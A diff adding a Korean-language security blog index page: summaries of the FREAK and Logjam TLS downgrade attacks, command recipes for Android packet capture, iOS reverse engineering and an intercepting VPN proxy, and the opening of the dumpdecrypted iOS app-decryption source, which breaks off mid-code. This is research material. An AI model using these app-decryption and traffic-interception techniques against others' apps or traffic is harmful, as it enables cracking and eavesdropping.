@@ -1,0 +1,1374 @@
+
+<!DOCTYPE html>
+<!--[if IEMobile 7 ]><html class="no-js iem7"><![endif]-->
+<!--[if lt IE 9]><html class="no-js lte-ie8"><![endif]-->
+<!--[if (gt IE 8)|(gt IEMobile 7)|!(IEMobile)|!(IE)]><!--><html class="no-js" lang="en"><!--<![endif]-->
+<head>
+  <meta charset="utf-8">
+  <title>My Octopress Blog</title>
+  <meta name="author" content="Your Name">
+
+  
+  <meta name="description" content="FREAK INRIA, Microsoft Research, IMDEA 의 암호학자들이 OpenSSL 을 사용한 프로그램에서 취약점을 발견했다. MitM 포지션을 잡고 있는 해커가, 커넥션의 암호화 강도를 떨어뜨릴 수 있는 취약점이다. &lsquo;export- &hellip;">
+  
+
+  <!-- http://t.co/dKP3o1e -->
+  <meta name="HandheldFriendly" content="True">
+  <meta name="MobileOptimized" content="320">
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+
+  
+  <link rel="canonical" href="http://yoursite.com/posts/5/">
+  <link href="/favicon.png" rel="icon">
+  <link href="/stylesheets/screen.css" media="screen, projection" rel="stylesheet" type="text/css">
+  <link href="/atom.xml" rel="alternate" title="My Octopress Blog" type="application/atom+xml">
+  <script src="/javascripts/modernizr-2.0.js"></script>
+  <script src="//ajax.googleapis.com/ajax/libs/jquery/1.9.1/jquery.min.js"></script>
+  <script>!window.jQuery && document.write(unescape('%3Cscript src="/javascripts/libs/jquery.min.js"%3E%3C/script%3E'))</script>
+  <script src="/javascripts/octopress.js" type="text/javascript"></script>
+  <!--Fonts from Google"s Web font directory at http://google.com/webfonts -->
+<link href="//fonts.googleapis.com/css?family=PT+Serif:regular,italic,bold,bolditalic" rel="stylesheet" type="text/css">
+<link href="//fonts.googleapis.com/css?family=PT+Sans:regular,italic,bold,bolditalic" rel="stylesheet" type="text/css">
+
+  
+
+</head>
+
+<body   >
+  <header role="banner"><hgroup>
+  <h1><a href="/">My Octopress Blog</a></h1>
+  
+    <h2>A blogging framework for hackers.</h2>
+  
+</hgroup>
+
+</header>
+  <nav role="navigation"><ul class="subscription" data-subscription="rss">
+  <li><a href="/atom.xml" rel="subscribe-rss" title="subscribe via RSS">RSS</a></li>
+  
+</ul>
+  
+<form action="https://www.google.com/search" method="get">
+  <fieldset role="search">
+    <input type="hidden" name="sitesearch" value="yoursite.com">
+    <input class="search" type="text" name="q" results="0" placeholder="Search"/>
+  </fieldset>
+</form>
+  
+<ul class="main-navigation">
+  <li><a href="/">Blog</a></li>
+  <li><a href="/blog/archives">Archives</a></li>
+</ul>
+
+</nav>
+  <div id="main">
+    <div id="content">
+      <div class="blog-index">
+  
+  
+  
+    <article>
+      
+  <header>
+    
+      <h1 class="entry-title"><a href="/blog/2015/06/05/freak/">FREAK</a></h1>
+    
+    
+      <p class="meta">
+        
+
+
+
+
+<time class='entry-date' datetime='2015-06-05T23:05:26+09:00'><span class='date'><span class='date-month'>Jun</span> <span class='date-day'>5</span><span class='date-suffix'>th</span>, <span class='date-year'>2015</span></span> <span class='time'>11:05 pm</span></time>
+        
+      </p>
+    
+  </header>
+
+
+  <div class="entry-content"><h3>FREAK</h3>
+
+<p>INRIA, Microsoft Research, IMDEA 의 암호학자들이 OpenSSL 을 사용한 프로그램에서 취약점을 발견했다. MitM 포지션을 잡고 있는 해커가, 커넥션의 암호화 강도를 떨어뜨릴 수 있는 취약점이다. &lsquo;export-grade&rsquo; 로 떨어뜨리는데, export RSA moduli 는 512 bits 이하이고, Amazon EC2 에서 12 시간 &amp; 100 불 정도에 팩터링할 수 있다고 한다. 이 정도 시간이면 실시간으로 https 세션을 감청한다던가, packet 을 inject 한다던가가 불가능한데, 문제는 apache mod_ssl 의 경우, RSA key 를 만드는 계산을 돌리는 것이 비싸기때문에, 리스타트될때까지 같은 RSA key 를 사용한다는 것. 이 경우 12 시간이 긴 시간이 아니게 되버린다.</p>
+
+<ul>
+<li><a href="https://www.smacktls.com">SMACK: State Machine Attacks</a></li>
+<li><a href="http://blog.cryptographyengineering.com/2015/03/attack-of-week-freak-or-factoring-nsa.html">Matthew Green 의 블로그</a></li>
+<li><a href="http://www.smacktls.com/smack.pdf">A Messy State of the Union: Taming the Composite State Machines of TLS</a></li>
+</ul>
+
+
+<h3>동작하는 방식</h3>
+
+<p>Matthew Green 의 블로그를 요약해본다.</p>
+
+<ol>
+<li>Client Hello 에서 client 는 표준 &lsquo;RSA&rsquo; ciphersuite 를 요청한다.</li>
+<li>MitM 해커는 메시지를 &lsquo;export RSA&rsquo; 요청으로 바꿔친다.</li>
+<li>서버는 512-bit export RSA key 로 응답한다. private key 로 서명해서.</li>
+<li>Client 는 취약한 키를 받아들인다. OpenSSL/SecureTransport 버그로 인해.</li>
+</ol>
+
+
+<h3>예상되는 피해</h3>
+
+<h3>Factoring &lsquo;export-grade&rsquo; RSA</h3>
+</div>
+  
+  
+
+
+    </article>
+  
+  
+    <article>
+      
+  <header>
+    
+      <h1 class="entry-title"><a href="/blog/2015/06/05/logjam-diffie-hellman-falls-down/">Logjam: Diffie-Hellman Falls Down</a></h1>
+    
+    
+      <p class="meta">
+        
+
+
+
+
+<time class='entry-date' datetime='2015-06-05T18:30:24+09:00'><span class='date'><span class='date-month'>Jun</span> <span class='date-day'>5</span><span class='date-suffix'>th</span>, <span class='date-year'>2015</span></span> <span class='time'>6:30 pm</span></time>
+        
+      </p>
+    
+  </header>
+
+
+  <div class="entry-content"><ul>
+<li><a href="https://weakdh.org/imperfect-forward-secrecy.pdf">Imperfect Forward Secrecy: How Diffie-Hellman Fails in Practice</a></li>
+<li><a href="http://blog.cryptographyengineering.com/2015/05/attack-of-week-logjam.html">Attack of the week: Logjam</a></li>
+</ul>
+
+
+<h3>Matthew Green Blog 요약</h3>
+
+<ul>
+<li>알려진 가장 좋은 방법은 g<sup>a</sup> 를 캡쳐해서, log(g<sup>a</sup>) = a 인 이산로그 문제를 푸는 것.</li>
+<li>p 가 2048 bits 정도이면 수학적으로 풀기 어렵다.</li>
+<li><p>p 가 512 bits 라면?</p></li>
+<li><p>서버가 DHE-EXPORT 를 지원한다면, 공격자가 negotiation message 를 edit 해서, client 가 지원하는 cipher list 를 DHE-EXPORT 만 지원한다고 바꿔놓는다.</p></li>
+<li>이제 서버는 client 가 DHE-EXPORT 만 지원한다고 믿게 된다.</li>
+<li>이제 서버는 512-bit export-grade Diffie-Hellman tuple 을 보낸다.</li>
+<li>클라이언트는 512-bit DH tuple 을 믿어버린다. (클라이언트는 DHE-EXPORT 컨텍스트에서 negotiation 되고 있다는 것을 모른다)</li>
+<li>허잡한 파라메터가 오는데도 클라이언트는 모른다.</li>
+<li>Negotiation 마지막에 Finished 메시지에 지금까지 교환되었던 negotiation message 의 MAC 이 교환되는데, 이것때문에 뽀록난다.</li>
+<li>DH key 를 깨야한다. Finished 메시지가 교환되기전에.</li>
+<li>깰 수 있다면, forged Finished 메시지를 만들 수 있다.</li>
+</ul>
+
+
+<h3>Can you really solve a discrete logarithm before a TLS handshake times out?</h3>
+
+<p>Number Field Sieve 를 사용해야하는데, 이걸 optimize 할 수 있다.</p>
+
+<ul>
+<li>Pre-computation (for a given prime p): Polynomial selection, sieving, linear algebra 로 구성된 작업. p 에만 dependant.</li>
+<li>Solving to find a (for a given g<sup>a</sup> mod p): precomputation 에서 만들어진 table 을 사용한다. g, g<sup>a</sup> 를 가지고 table 을 사용하여 a 를 찾는 알고리즘.</li>
+</ul>
+
+
+<p>Pre-computation 은 p 에 dependant 한데. 그렇다면 실제 TLS 에서 p 는 어떻게 generate 되는 걸까?</p>
+
+<p>Large-scale 로 진행된 internet scan 에서 Apache/mod_ssl 의 92% 는 DH-EXPORT 의 경우, 2 개의 소수만 사용했다고 한다. 이 경우 2 개의 p 에 대해서만 테이블을 만들면 된다.</p>
+</div>
+  
+  
+
+
+    </article>
+  
+  
+    <article>
+      
+  <header>
+    
+      <h1 class="entry-title"><a href="/blog/2015/06/04/using-wireshark-with-android/">Using Wireshark With Android</a></h1>
+    
+    
+      <p class="meta">
+        
+
+
+
+
+<time class='entry-date' datetime='2015-06-04T13:49:09+09:00'><span class='date'><span class='date-month'>Jun</span> <span class='date-day'>4</span><span class='date-suffix'>th</span>, <span class='date-year'>2015</span></span> <span class='time'>1:49 pm</span></time>
+        
+      </p>
+    
+  </header>
+
+
+  <div class="entry-content"><figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>$ adb shell "tcpdump -s 0 -w - | nc -l -p 4444"
+</span><span class='line'>$ adb forward tcp:4444 tcp:4444
+</span><span class='line'>$ nc localhost 4444 | sudo wireshark -k -S -i -</span></code></pre></td></tr></table></div></figure>
+
+</div>
+  
+  
+
+
+    </article>
+  
+  
+    <article>
+      
+  <header>
+    
+      <h1 class="entry-title"><a href="/blog/2015/06/04/ios-building-a-basic-toolkit/">iOS: Building a Basic Toolkit</a></h1>
+    
+    
+      <p class="meta">
+        
+
+
+
+
+<time class='entry-date' datetime='2015-06-04T13:23:03+09:00'><span class='date'><span class='date-month'>Jun</span> <span class='date-day'>4</span><span class='date-suffix'>th</span>, <span class='date-year'>2015</span></span> <span class='time'>1:23 pm</span></time>
+        
+      </p>
+    
+  </header>
+
+
+  <div class="entry-content"><h4>Cydia</h4>
+
+<h4>BigBoss Recommended Tools</h4>
+
+<h4>otool</h4>
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+<span class='line-number'>9</span>
+<span class='line-number'>10</span>
+<span class='line-number'>11</span>
+<span class='line-number'>12</span>
+<span class='line-number'>13</span>
+<span class='line-number'>14</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'># Inspect the Objective-C segment to reveal class and method names:
+</span><span class='line'>$ otool -oV MAHHApp
+</span><span class='line'>
+</span><span class='line'># List the libraries used by the binary:
+</span><span class='line'>$ otool -L MAHHApp
+</span><span class='line'>
+</span><span class='line'># List the symbols exported by a binary
+</span><span class='line'>$ otool -IV MAHHApp
+</span><span class='line'>
+</span><span class='line'># Display the short-form header information:
+</span><span class='line'>$ otool -hV MAHHApp
+</span><span class='line'>
+</span><span class='line'># Display the binary load commands:
+</span><span class='line'>$ otool -l MAHHApp</span></code></pre></td></tr></table></div></figure>
+
+
+<h4>nm</h4>
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>$ nm MAHHApp</span></code></pre></td></tr></table></div></figure>
+
+
+<h4>lipo</h4>
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>$ lipo -info MAHHApp
+</span><span class='line'>$ lipo -thin &lt;arch_type&gt; -output MAHHApp-v7 MAHHApp</span></code></pre></td></tr></table></div></figure>
+
+
+<h4>Debuggers</h4>
+
+<ul>
+<li>gdb (Help: <a href="http://www.pod2g.org/2012/02/working-gnu-debugger-on-ios-43.html">here</a></li>
+<li>radare (Add cydia repo as a source, <a href="http://cydia.radare.org">http://cydia.radare.org</a>)</li>
+</ul>
+
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>$ lipo -thin armv7 gdb-arm-apple-darwin -output gdb-arm7</span></code></pre></td></tr></table></div></figure>
+
+
+<h4>Tools for Signing Binaries</h4>
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'># To sign or replace an existing signature, use the following command:
+</span><span class='line'>$ codesign -v -fs "CodeSignIdentity" MAHHApp.app/
+</span><span class='line'>
+</span><span class='line'># To display the code signature of an application:
+</span><span class='line'>$ codesign -v -d MAHHApp.app</span></code></pre></td></tr></table></div></figure>
+
+
+<ul>
+<li>saurik&rsquo;s ldid: <a href="http://www.saurik.com/id/8">here</a></li>
+</ul>
+
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>$ ldid -S MAHHApp</span></code></pre></td></tr></table></div></figure>
+
+
+<h4>Installipa</h4>
+
+<ul>
+<li><a href="https://github.com/autopear/ipainstaller">here</a></li>
+<li>AppSync (repo: <a href="http://cydia.appaddict.org">http://cydia.appaddict.org</a>)</li>
+</ul>
+
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'># ipainstaller Lab1.1a.ipa
+</span><span class='line'>Analyzing Lab1.1a.ipa...
+</span><span class='line'>Installing lab1.1a (v1.0)...
+</span><span class='line'>Installed lab1.1a (v1.0) successfully.</span></code></pre></td></tr></table></div></figure>
+
+
+<h4>Exploring the Filesystem</h4>
+
+<ul>
+<li><a href="http://2013.hackitoergosum.org/presentations/Day3-04.Hacking%20apple%20accessories%20to%20pown%20iDevices%20%E2%80%93%20Wake%20up%20Neo!%20Your%20phone%20got%20pwnd%20!%20by%20Mathieu%20GoToHack%20RENARD.pdf">Mathieu Renard</a></li>
+<li>iExplorer</li>
+<li>iFunBox</li>
+</ul>
+
+
+<h4>Property Lists</h4>
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'># plutil com.google.Authenticator.plist
+</span><span class='line'>$ plutil -convert xml1 com.google.Authenticator.plist
+</span><span class='line'>$ plutil -convert binary1 com.google.Authenticator.plist</span></code></pre></td></tr></table></div></figure>
+
+</div>
+  
+  
+
+
+    </article>
+  
+  
+    <article>
+      
+  <header>
+    
+      <h1 class="entry-title"><a href="/blog/2015/06/02/setting-up-an-intercepting-proxy-on-linux/">Setting Up an Intercepting Proxy on Linux</a></h1>
+    
+    
+      <p class="meta">
+        
+
+
+
+
+<time class='entry-date' datetime='2015-06-02T00:25:15+09:00'><span class='date'><span class='date-month'>Jun</span> <span class='date-day'>2</span><span class='date-suffix'>nd</span>, <span class='date-year'>2015</span></span> <span class='time'>12:25 am</span></time>
+        
+      </p>
+    
+  </header>
+
+
+  <div class="entry-content"><p>iPhone VPN 설정을 해서, 앱 트래픽을 VPN 서버로 돌리고, VPN 서버에서 트래픽을 까본다음에, 원래 목적지로 릴레이해주는 테크닉.</p>
+
+<h3>Box</h3>
+
+<p>우선 DigitalOcean 에 Ubuntu box 를 하나 만든다.</p>
+
+<h3>PPTP</h3>
+
+<p>이제 Ubuntu 박스에 VPN 서버를 설치해야 한다.</p>
+
+<p><a href="https://www.digitalocean.com/community/tutorials/how-to-setup-your-own-vpn-with-pptp">How To Setup Your Own VPN With PPTP</a></p>
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+<span class='line-number'>9</span>
+<span class='line-number'>10</span>
+<span class='line-number'>11</span>
+<span class='line-number'>12</span>
+<span class='line-number'>13</span>
+<span class='line-number'>14</span>
+<span class='line-number'>15</span>
+<span class='line-number'>16</span>
+<span class='line-number'>17</span>
+<span class='line-number'>18</span>
+<span class='line-number'>19</span>
+<span class='line-number'>20</span>
+<span class='line-number'>21</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>sudo apt-get install pptpd
+</span><span class='line'>
+</span><span class='line'>/etc/pptpd.conf
+</span><span class='line'>localip 10.0.0.1
+</span><span class='line'>remoteip 10.0.0.100-200
+</span><span class='line'>
+</span><span class='line'>/etc/ppp/chap-secrets
+</span><span class='line'>box1 pptpd kkkkkkkk
+</span><span class='line'>
+</span><span class='line'>/etc/ppp/pptpd-options
+</span><span class='line'>ms-dns 8.8.8.8
+</span><span class='line'>ms-dns 8.8.4.4
+</span><span class='line'>
+</span><span class='line'>service pptpd restart
+</span><span class='line'>
+</span><span class='line'>netstat -alpn | grep :1723
+</span><span class='line'>
+</span><span class='line'>/etc/sysctl.conf
+</span><span class='line'>net.ipv4.ip_forward = 1
+</span><span class='line'>
+</span><span class='line'>sysctl -p</span></code></pre></td></tr></table></div></figure>
+
+
+<h3>iptables</h3>
+
+<p>NAT 룰 셋업을 해주고, 특정 포트로 향하는 트래픽만 리다이렉트한다.</p>
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>iptables -t nat -A POSTROUTING -o eth0 -j MASQUERADE && iptables-save
+</span><span class='line'>
+</span><span class='line'>iptables -t nat -A PREROUTING -i ppp+ -p tcp -d 1.2.3.4 --dport 25201 -j REDIRECT --to-port 9999</span></code></pre></td></tr></table></div></figure>
+
+
+<h3>socat</h3>
+
+<p>인터셉트된 트래픽을 덤프하고, 원래 호스트로 릴레이해준다.</p>
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>socat -v TCP-LISTEN:9999,fork TCP:1.2.3.4:25201
+</span><span class='line'>
+</span><span class='line'>tshark -i ppp0</span></code></pre></td></tr></table></div></figure>
+
+</div>
+  
+  
+
+
+    </article>
+  
+  
+    <article>
+      
+  <header>
+    
+      <h1 class="entry-title"><a href="/blog/2015/06/01/ios-app-automating-the-decryption-process/">iOS App: Automating the Decryption Process</a></h1>
+    
+    
+      <p class="meta">
+        
+
+
+
+
+<time class='entry-date' datetime='2015-06-01T15:15:35+09:00'><span class='date'><span class='date-month'>Jun</span> <span class='date-day'>1</span><span class='date-suffix'>st</span>, <span class='date-year'>2015</span></span> <span class='time'>3:15 pm</span></time>
+        
+      </p>
+    
+  </header>
+
+
+  <div class="entry-content"><p><a href="https://github.com/stefanesser/dumpdecrypted">dumpdecryted</a></p>
+
+<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+<span class='line-number'>9</span>
+<span class='line-number'>10</span>
+<span class='line-number'>11</span>
+<span class='line-number'>12</span>
+<span class='line-number'>13</span>
+<span class='line-number'>14</span>
+<span class='line-number'>15</span>
+<span class='line-number'>16</span>
+<span class='line-number'>17</span>
+<span class='line-number'>18</span>
+<span class='line-number'>19</span>
+<span class='line-number'>20</span>
+<span class='line-number'>21</span>
+<span class='line-number'>22</span>
+<span class='line-number'>23</span>
+<span class='line-number'>24</span>
+<span class='line-number'>25</span>
+<span class='line-number'>26</span>
+<span class='line-number'>27</span>
+<span class='line-number'>28</span>
+<span class='line-number'>29</span>
+<span class='line-number'>30</span>
+<span class='line-number'>31</span>
+<span class='line-number'>32</span>
+<span class='line-number'>33</span>
+<span class='line-number'>34</span>
+<span class='line-number'>35</span>
+<span class='line-number'>36</span>
+<span class='line-number'>37</span>
+<span class='line-number'>38</span>
+<span class='line-number'>39</span>
+<span class='line-number'>40</span>
+<span class='line-number'>41</span>
+<span class='line-number'>42</span>
+<span class='line-number'>43</span>
+<span class='line-number'>44</span>
+<span class='line-number'>45</span>
+<span class='line-number'>46</span>
+<span class='line-number'>47</span>
+<span class='line-number'>48</span>
+<span class='line-number'>49</span>
+<span class='line-number'>50</span>
+<span class='line-number'>51</span>
+<span class='line-number'>52</span>
+<span class='line-number'>53</span>
+<span class='line-number'>54</span>
+<span class='line-number'>55</span>
+<span class='line-number'>56</span>
+<span class='line-number'>57</span>
+<span class='line-number'>58</span>
+<span class='line-number'>59</span>
+<span class='line-number'>60</span>
+<span class='line-number'>61</span>
+<span class='line-number'>62</span>
+<span class='line-number'>63</span>
+<span class='line-number'>64</span>
+<span class='line-number'>65</span>
+<span class='line-number'>66</span>
+<span class='line-number'>67</span>
+<span class='line-number'>68</span>
+<span class='line-number'>69</span>
+<span class='line-number'>70</span>
+<span class='line-number'>71</span>
+<span class='line-number'>72</span>
+<span class='line-number'>73</span>
+<span class='line-number'>74</span>
+<span class='line-number'>75</span>
+<span class='line-number'>76</span>
+<span class='line-number'>77</span>
+<span class='line-number'>78</span>
+<span class='line-number'>79</span>
+<span class='line-number'>80</span>
+<span class='line-number'>81</span>
+<span class='line-number'>82</span>
+<span class='line-number'>83</span>
+<span class='line-number'>84</span>
+<span class='line-number'>85</span>
+<span class='line-number'>86</span>
+<span class='line-number'>87</span>
+<span class='line-number'>88</span>
+<span class='line-number'>89</span>
+<span class='line-number'>90</span>
+<span class='line-number'>91</span>
+<span class='line-number'>92</span>
+<span class='line-number'>93</span>
+<span class='line-number'>94</span>
+<span class='line-number'>95</span>
+<span class='line-number'>96</span>
+<span class='line-number'>97</span>
+<span class='line-number'>98</span>
+<span class='line-number'>99</span>
+<span class='line-number'>100</span>
+<span class='line-number'>101</span>
+<span class='line-number'>102</span>
+<span class='line-number'>103</span>
+<span class='line-number'>104</span>
+<span class='line-number'>105</span>
+<span class='line-number'>106</span>
+<span class='line-number'>107</span>
+<span class='line-number'>108</span>
+<span class='line-number'>109</span>
+<span class='line-number'>110</span>
+<span class='line-number'>111</span>
+<span class='line-number'>112</span>
+<span class='line-number'>113</span>
+<span class='line-number'>114</span>
+<span class='line-number'>115</span>
+<span class='line-number'>116</span>
+<span class='line-number'>117</span>
+<span class='line-number'>118</span>
+<span class='line-number'>119</span>
+<span class='line-number'>120</span>
+<span class='line-number'>121</span>
+<span class='line-number'>122</span>
+<span class='line-number'>123</span>
+<span class='line-number'>124</span>
+<span class='line-number'>125</span>
+<span class='line-number'>126</span>
+<span class='line-number'>127</span>
+<span class='line-number'>128</span>
+<span class='line-number'>129</span>
+<span class='line-number'>130</span>
+<span class='line-number'>131</span>
+<span class='line-number'>132</span>
+<span class='line-number'>133</span>
+<span class='line-number'>134</span>
+<span class='line-number'>135</span>
+<span class='line-number'>136</span>
+<span class='line-number'>137</span>
+<span class='line-number'>138</span>
+<span class='line-number'>139</span>
+<span class='line-number'>140</span>
+<span class='line-number'>141</span>
+<span class='line-number'>142</span>
+<span class='line-number'>143</span>
+<span class='line-number'>144</span>
+<span class='line-number'>145</span>
+<span class='line-number'>146</span>
+<span class='line-number'>147</span>
+<span class='line-number'>148</span>
+<span class='line-number'>149</span>
+<span class='line-number'>150</span>
+<span class='line-number'>151</span>
+<span class='line-number'>152</span>
+<span class='line-number'>153</span>
+<span class='line-number'>154</span>
+<span class='line-number'>155</span>
+<span class='line-number'>156</span>
+<span class='line-number'>157</span>
+<span class='line-number'>158</span>
+<span class='line-number'>159</span>
+<span class='line-number'>160</span>
+<span class='line-number'>161</span>
+<span class='line-number'>162</span>
+<span class='line-number'>163</span>
+<span class='line-number'>164</span>
+<span class='line-number'>165</span>
+<span class='line-number'>166</span>
+<span class='line-number'>167</span>
+<span class='line-number'>168</span>
+<span class='line-number'>169</span>
+<span class='line-number'>170</span>
+<span class='line-number'>171</span>
+<span class='line-number'>172</span>
+<span class='line-number'>173</span>
+<span class='line-number'>174</span>
+<span class='line-number'>175</span>
+<span class='line-number'>176</span>
+<span class='line-number'>177</span>
+<span class='line-number'>178</span>
+<span class='line-number'>179</span>
+<span class='line-number'>180</span>
+<span class='line-number'>181</span>
+<span class='line-number'>182</span>
+<span class='line-number'>183</span>
+<span class='line-number'>184</span>
+<span class='line-number'>185</span>
+<span class='line-number'>186</span>
+<span class='line-number'>187</span>
+</pre></td><td class='code'><pre><code class='c'><span class='line'><span class="cp">#include &lt;stdio.h&gt;</span>
+</span><span class='line'><span class="cp">#include &lt;stdlib.h&gt;</span>
+</span><span class='line'><span class="cp">#include &lt;unistd.h&gt;</span>
+</span><span class='line'><span class="cp">#include &lt;string.h&gt;</span>
+</span><span class='line'><span class="cp">#include &lt;fcntl.h&gt;</span>
+</span><span class='line'><span class="cp">#include &lt;mach-o/fat.h&gt;</span>
+</span><span class='line'><span class="cp">#include &lt;mach-o/loader.h&gt;</span>
+</span><span class='line'>
+</span><span class='line'><span class="k">struct</span> <span class="n">ProgramVars</span> <span class="p">{</span>
+</span><span class='line'>    <span class="k">struct</span> <span class="n">mach_header</span><span class="o">*</span> <span class="n">mh</span><span class="p">;</span>
+</span><span class='line'>    <span class="kt">int</span><span class="o">*</span> <span class="n">NXArgcPtr</span><span class="p">;</span>
+</span><span class='line'>    <span class="k">const</span> <span class="kt">char</span><span class="o">***</span> <span class="n">NXArgvPtr</span><span class="p">;</span>
+</span><span class='line'>    <span class="k">const</span> <span class="kt">char</span><span class="o">***</span> <span class="n">environPtr</span><span class="p">;</span>
+</span><span class='line'>    <span class="k">const</span> <span class="kt">char</span> <span class="o">**</span> <span class="n">__prognamePtr</span><span class="p">;</span>
+</span><span class='line'><span class="p">};</span>
+</span><span class='line'>
+</span><span class='line'><span class="cp">#define swap32(value) (((value&amp;0xFF000000) &gt;&gt; 24) | ((value &amp; 0x00FF0000) &gt;&gt; 8) | ((value &amp; 0x0000FF00) &lt;&lt; 8) | ((value &amp; 0x000000FF) &lt;&lt; 24))</span>
+</span><span class='line'>
+</span><span class='line'><span class="n">__attribute__</span><span class="p">((</span><span class="n">constructor</span><span class="p">))</span>
+</span><span class='line'><span class="kt">void</span> <span class="n">dumptofile</span><span class="p">(</span><span class="kt">int</span> <span class="n">argc</span><span class="p">,</span> <span class="k">const</span> <span class="kt">char</span> <span class="o">**</span><span class="n">argv</span><span class="p">,</span> <span class="k">const</span> <span class="kt">char</span> <span class="o">**</span><span class="n">envp</span><span class="p">,</span> <span class="k">const</span> <span class="kt">char</span> <span class="o">**</span><span class="n">apple</span><span class="p">,</span> <span class="k">struct</span> <span class="n">ProgramVars</span> <span class="o">*</span><span class="n">pvars</span><span class="p">)</span>
+</span><span class='line'><span class="p">{</span>
+</span><span class='line'>    <span class="k">struct</span> <span class="n">load_command</span> <span class="o">*</span><span class="n">lc</span><span class="p">;</span>
+</span><span class='line'>    <span class="k">struct</span> <span class="n">encryption_info_command</span> <span class="o">*</span><span class="n">eic</span><span class="p">;</span>
+</span><span class='line'>    <span class="k">struct</span> <span class="n">fat_header</span> <span class="o">*</span><span class="n">fh</span><span class="p">;</span>
+</span><span class='line'>    <span class="k">struct</span> <span class="n">fat_arch</span> <span class="o">*</span><span class="n">arch</span><span class="p">;</span>
+</span><span class='line'>    <span class="k">struct</span> <span class="n">mach_header</span> <span class="o">*</span><span class="n">mh</span><span class="p">;</span>
+</span><span class='line'>    <span class="kt">char</span> <span class="n">buffer</span><span class="p">[</span><span class="mi">1024</span><span class="p">];</span>
+</span><span class='line'>    <span class="kt">char</span> <span class="n">rpath</span><span class="p">[</span><span class="mi">4096</span><span class="p">],</span><span class="n">npath</span><span class="p">[</span><span class="mi">4096</span><span class="p">];</span>
+</span><span class='line'>    <span class="kt">unsigned</span> <span class="kt">int</span> <span class="n">fileoffs</span><span class="o">=</span><span class="mi">0</span><span class="p">,</span><span class="n">off_cryptid</span><span class="o">=</span><span class="mi">0</span><span class="p">,</span><span class="n">restsize</span><span class="p">;</span>
+</span><span class='line'>    <span class="kt">int</span> <span class="n">i</span><span class="p">,</span><span class="n">fd</span><span class="p">,</span><span class="n">outfd</span><span class="p">,</span><span class="n">r</span><span class="p">,</span><span class="n">n</span><span class="p">,</span><span class="n">toread</span><span class="p">;</span>
+</span><span class='line'>    <span class="kt">char</span> <span class="o">*</span><span class="n">tmp</span><span class="p">;</span>
+</span><span class='line'>
+</span><span class='line'>    <span class="n">printf</span><span class="p">(</span><span class="s">&quot;mach-o decryption dumper</span><span class="se">\n\n</span><span class="s">&quot;</span><span class="p">);</span>
+</span><span class='line'>    <span class="n">printf</span><span class="p">(</span><span class="s">&quot;DISCLAIMER: This tool is only meant for security research purposes, not for application crackers.</span><span class="se">\n\n</span><span class="s">&quot;</span><span class="p">);</span>
+</span><span class='line'>
+</span><span class='line'>    <span class="k">if</span> <span class="p">(</span><span class="n">pvars</span><span class="o">-&gt;</span><span class="n">mh</span><span class="o">-&gt;</span><span class="n">magic</span> <span class="o">==</span> <span class="n">MH_MAGIC_64</span><span class="p">)</span> <span class="p">{</span>
+</span><span class='line'>        <span class="n">lc</span> <span class="o">=</span> <span class="p">(</span><span class="k">struct</span> <span class="n">load_command</span> <span class="o">*</span><span class="p">)((</span><span class="kt">unsigned</span> <span class="kt">char</span><span class="o">*</span><span class="p">)</span><span class="n">pvars</span><span class="o">-&gt;</span><span class="n">mh</span> <span class="o">+</span> <span class="k">sizeof</span><span class="p">(</span><span class="k">struct</span> <span class="n">mach_header_64</span><span class="p">));</span>
